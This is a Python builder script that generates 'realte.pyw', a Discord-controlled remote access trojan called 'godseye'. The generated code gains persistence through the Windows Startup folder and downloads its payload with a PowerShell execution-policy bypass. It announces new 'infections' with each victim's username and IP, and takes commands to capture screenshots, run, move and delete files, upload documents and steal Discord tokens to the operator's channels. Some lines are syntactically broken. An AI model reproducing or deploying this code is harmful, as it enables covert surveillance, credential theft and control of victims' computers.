import os
import json
os.chdir("../")
with open('config.json') as f:
    config = json.load(f)
    token = config.get('token')
    PLC1=config.get('PLC')
    IFC1=config.get('IFC')
    PIC1=config.get('PIC')
    HTP1=config.get('HTP')
    TLC1=config.get('TLC')

mainstr=(((f"""
import requests
import threading 
import urllib import os
import time
import random 
import json 
import urllib.request
import discord
import string
import base64
import os.path
from discord.utils import get
from discord.ext import commands
from PIL import ImageGrab
from os import path
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet


#requirements = ["","lxml","discord.py","requests","pillow","admin","pynput"]
#with open(f'requirements.txt', 'a') as saveFile:
#    saveFile.write('\n'.join(requirements))
#    
#def check():
#    subprocess.check_call([sys.executable, '-m','pip', 'install','-r',"requirements.txt"])
#check()
#os.remove("requirements.txt")


external_ip = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
pc_username = os.getenv('UserName')
pc_name = os.getenv('COMPUTERNAME')

#GRAB OUTSIDE VARIABLE
def VariableGrab(index):
    oldurl = 'https://pastebin.com/raw/CeRCVhZP'
    OR = requests.get(oldurl)
    ocontent = OR.text
    for every in ocontent:
        contentin = ocontent.split()
    url = contentin[0]
    r = requests.get(url)
    content = r.text
    for each in content:
        ContentGrabbed = content.split()
    IndexGrabbed = ContentGrabbed[index]
    return IndexGrabbed

#GLOBAL VARIABLES
global PLC
global IFC
global GRL
global PIC
global HTP
global DiscordBotToken
global URI
global OnlineVersion
global CurrentVersion
global TLC


DiscordBotToken ={token}
PLC = {PLC1}  # PAYLOAD-CHANNEL-ID
IFC = {IFC1}  # INFECTIONS-CHANNEL-ID
PIC = {PIC1}  # SCREENSHOT-CHANNEL-ID
HTP = {HTP1}   # HTTPSERVER-CHANNEL-ID
TLC={TLC1} #tokenlogger channel
URI ="https://cdn.discordapp.com/attachments/868361386240122880/872168121702699028/Realte.pyw" # PAYLOAD-DOWNLOAD
OnlineVersion = str(VariableGrab(19))
""")))
str2=((("""
godseye = commands.Bot(command_prefix=("$"))
CurrentVersion = "1.0.0.6"
channelname=external_ip.replace(".","")

godseye.remove_command('help')
@godseye.event
async def on_ready():
      global active
      global PingStart
      active = False
      PingStart = False
      DeleteOldVersion = False
      os.popen(f"powershell ")
      file = os.path.exists(f"C:/Users/{pc_username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Realte.pyw")
      if CurrentVersion != OnlineVersion:
          DeleteOldVersion = True
      if file and DeleteOldVersion:
          os.remove(f"C:/Users/{pc_username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Realte.pyw")
          file = os.path.exists(f"C:/Users/{pc_username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Realte.pyw")
      if not file:
          CommandString = (f"powershell -executionpolicy bypass -command Invoke-WebRequest -Uri {URI} -OutFile 'Realte.pyw'")
          time.sleep
          #godseye.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name='C2 Commands'))
          infections=godseye.get_channel(874824520693874756)
          general = godseye.get_channel(874824520693874755)
          await  infections.send(f"new infection Username- {pc_username}, PC name- {pc_name}, ip address-{external_ip}")
          channels=[]
          guild = godseye.get_guild(874824520467349504)
          for c in guild.channels:
            channels.append(c.name)
          if channelname in channels:
            await infections.send("[❎] Duplicate Connection")
            await infections.send(f"[☑️] INFECTION {external_ip} Has completed initial setup with 0 errors. Connection is ready and listening for commands.")
          else:
            await guild.create_text_channel(channelname)
            await infections.send("[〽️] Channel Created")
            await infections.send(f"[☑️] INFECTION {external_ip} Has completed initial setup with 0 errors. Connection is ready and listening for commands.")
          #with urllib.request.urlopen("https://geolocation-db.com/json") as url:
            #data = json.loads(url.read().decode())
            #link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
            #channel=godseye.get_channel(879353896902996049)
            #datatosend=(f'{pc_username}~{external_ip}~{link}")')
            #await channel.send(datatosend)
           

@godseye.command()
async def screenshot(ctx):
  if str(ctx.channel)==str(channelname):
    snapshot = ImageGrab.grab()
    save_path = ("MySnapshot.jpg")
    snapshot.save(save_path)
    picchan=godseye.get_channel(PIC)
    with open('MySnapshot.jpg', 'rb') as f:
      picture = discord.File(f)
      await picchan.send(file=picture)
      await ctx.message.delete()
      time.sleep(1)   
      os.remove("MySnapshot.jpg")
    


@godseye.command()
async def ping(ctx,arg):
  await ctx.message.delete()
  if arg==external_ip:
    if active==True:
      await ctx.send(f"ping {external_ip} successful")
    
  else:
    if arg==("all"):
      if active==True:
          await ctx.send(f"ping {external_ip} successful")
    else:
      await ctx.send("invalid option or target is offline")

@godseye.command()
async def run (ctx,arg):
  await ctx.message.delete()
  if str(ctx.channel)==str(channelname):
    file = os.path.exists(arg)
    if file:
      os.system(arg)
      await ctx.send("[+] File Ran Successfully")
    else:
      await ctx.send("[-] File Did Not Run")
  

@godseye.command()
async def delete (ctx,arg):
  if str(ctx.channel)==str(channelname):
    DeleteFile = arg
    try:
      os.remove(DeleteFile)
      await message.channel.send(f"[+] File Deleted Sucessfully")
    except:
      await message.channel.send(f"[-] FIle Not Deleted") 
      return
    

@godseye.command()
async def move (ctx,arg1,arg2):
  if str(ctx.channel)==str(channelname):
     MoveFile =arg1
     path =arg2
     os.popen(f"powershell -executionpolicy bypass -command Move-Item -Path {MoveFile} -Destination {path}")

@godseye.command()
async def help(ctx):
  await ctx.message.delete()
  commands=["help menu"," Attack the target"," Take a screenshot of their computer screen"," Start/stop/dump keylog file"," Ping all ip's or just a specific ip to see if connection is active"," Stop the connection on a machine"," Accurate geo-location","Browser history","Http file access","Test all channels","Upload a file to target computer"," Move a file within target computer","Run a file on target computer","Pip install a requirment on target computer","Delete a file on target computer","Ip of connection","Nuke server"]
  length=len(commands)
  print(length)
  embed = discord.Embed(title="COMMANDS",url="",description="commands")
  embed.add_field(name="$help:", value=commands[0], inline=True)
  embed.add_field(name="$attack (ip)", value=commands[1], inline=True)
  embed.add_field(name="$screenshot:", value=commands[2], inline=False)
  embed.add_field(name="$(start/stop/dump)keylogger:", value=commands[3], inline=False)
  embed.add_field(name="$ping(all/IP):", value=commands[4], inline=False)
  embed.add_field(name="$stop:", value=commands[5], inline=False)
  embed.add_field(name="$location:", value=commands[6], inline=False)
  embed.add_field(name="$history:", value=commands[7], inline=False)
  embed.add_field(name="$http:", value=commands[8], inline=False)
  embed.add_field(name="$test:", value=commands[9], inline=False)
  embed.add_field(name="$upload:", value=commands[10], inline=False)
  embed.add_field(name="$move:", value=commands[11], inline=False)
  embed.add_field(name="$run", value=commands[12], inline=False)
  embed.add_field(name="$pip install", value=commands[13], inline=False)
  embed.add_field(name="$delete:", value=commands[14], inline=False)
  embed.add_field(name="$ip:", value=commands[15], inline=False)
  embed.add_field(name="$nuke:", value=commands[16], inline=False)
  await ctx.send(embed=embed)

@godseye.command()
async def nuke (ctx):
  Guild=ctx.guild
  whitelist=["general","infections","http-servers","dropped-payloads","screenshots-pictures-videos","discord-token","ddos-connections","ddos-attacks","Panel"]
  for channel in Guild.channels:
    if (channel.name in whitelist):  
      continue
    else:
      await channel.delete()

@godseye.command()
async def downdir(ctx,arg):
  if str(ctx.channel)==str(channelname):
    await ctx.message.delete()
    #only supports main dirs, pics, desktop, downloads etc)
    dirs=["desktop","downloads","pictures","videos","documents","music"]
    if arg in dirs:
      os.chdir(f"C://users/{pc_username}/{arg}"
      fileschan=(f"{channelname}s-files")
      channels=[]
      guild = godseye.get_guild(874824520467349504)
      for c in guild.channels:
        channels.append(c.name)
      if fileschan in channels:
        for file in os.listdir(os.getcwd()):
          if file.endswith(".txt"):
            with open(file, 'rb') as f:
              picture = discord.File(f)
              channel = discord.utils.get(ctx.guild.channels, name=fileschan)
              filessend=godseye.get_channel(channel.id)
              await filessend.send(file=picture)
      else:
        guild = godseye.get_guild(874824520467349504)
        await guild.create_text_channel(fileschan)
        for file in os.listdir(os.getcwd()):
          if file.endswith(".txt"):
            with open(file, 'rb') as f:
              picture = discord.File(f)
              channel = discord.utils.get(ctx.guild.channels, name=fileschan)
              filessend=godseye.get_channel(channel.id)
              await filessend.send(file=picture)
              
    else:
      await ctx.send("not a supported dir")

@godseye.command()
async def tokenlog(ctx):
  external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8'
  embeds = []
  working_tokens = []
  working_ids = []
  for platform, path in PATHS.items():
      if not os.path.exists(path):
          continue

      for token in get_tokens(path):

          uid = None
          if not token.startswith('mfa.'):
              try:
                  uid = b64decode(token.split('.')[0].encode()).decode()
              except:
                  pass

              if uid in working_ids:
                  continue
              else:
                  working_ids.append(uid)
              if token in working_tokens:
                  continue
              else:
                  working_tokens.append(token)
                  id_len=len(working_ids)
                  tokens_len=len(working_tokens)
                  count=0
                  while count<id_len:
                      tokens =client.get_channel(TLC)
                      await tokens.send(f"{working_tokens[count]} from {external_ip}")
                      time.sleep(3)
                      count=count+1


    

godseye.run(DiscordBotToken)
""")))
f = open("realte.pyw", "x")
f.write(mainstr)
f.close()
f = open("realte.pyw", "a")
f.write(str2)
f.close

